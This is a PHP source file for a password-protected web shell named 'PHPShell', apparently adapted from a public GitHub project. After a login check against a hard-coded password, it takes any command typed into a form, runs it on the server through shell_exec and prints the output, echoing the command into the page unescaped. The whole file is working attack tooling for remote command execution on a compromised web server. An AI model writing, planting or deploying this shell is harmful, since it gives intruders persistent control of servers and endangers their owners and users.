<?php # Ref: https://github.com/NullBrunk/WebShell
session_start();    
$PASSWD = "P@ssw0rd";
if ($_SESSION['password'] == true){echo "<p></p>";}
else{
	echo '
	<form action="" method="post" id="login_form"><p> Password : <input type="password" name="passw" size="100" rows="100" autofocus /> <input type="submit" value="Login"></p></form>';
}
if (isset($_POST['passw'])){if ($_POST['passw'] == $PASSWD){$_SESSION['password'] = true;}} 
?>
<head><title>PHPShell</title><meta charset="UTF-8" /></head>
<style>
    fieldset{padding:0 20px 20px 20px;margin-bottom:10px;border-radius:8px;}
    input{height: 25px;width: 70px;}
    input, textarea, select {padding:3px;border-radius:5px;width:500px;}
    select {margin-top:10px;}
    input[type=submit], input[type=reset] {width:60px;margin-left:5px;cursor:pointer;}
    .hidden {display: none;}
</style>
<?php
if ($_SESSION['password'] == true){
    echo '<script>
        document.getElementById("login_form").style.display = "none";
        document.getElementById("cmd").focus();
        function cpLastCmd() {
            var copyText = document.getElementById("lastCmd");
            navigator.clipboard.writeText(copyText.textContent);
            document.getElementById("COPIED").style.display = "block";
            setTimeout(function(){
                document.getElementById("COPIED").style.display = "none";
            },2000)
        }
    </script>
	<form action="" method="post">
	<p><input type="text" name="command" id="cmd" size="100" rows="100" autofocus /> <input type="submit" value="execute"></p>
	</form>
	<hr>
	';
	if (isset($_POST['command'])) 
	{
		$command = $_POST['command'];
		if($command=='ll'){$command='ls -lah';}
		echo "Last command used : <b style='color:red' id='lastCmd' onclick='cpLastCmd()'>$command</b>";
		echo "<div class='COPIED' id='COPIED' name='COPIED' style='color:blue;display:none;'>Successfully copied</div>";
		echo "<a><pre>".shell_exec($command)."</pre></a>";
	}
	else{echo "<p>No command specified</p>";}
}
else{echo "<p>Please enter the password</p>";}
?>
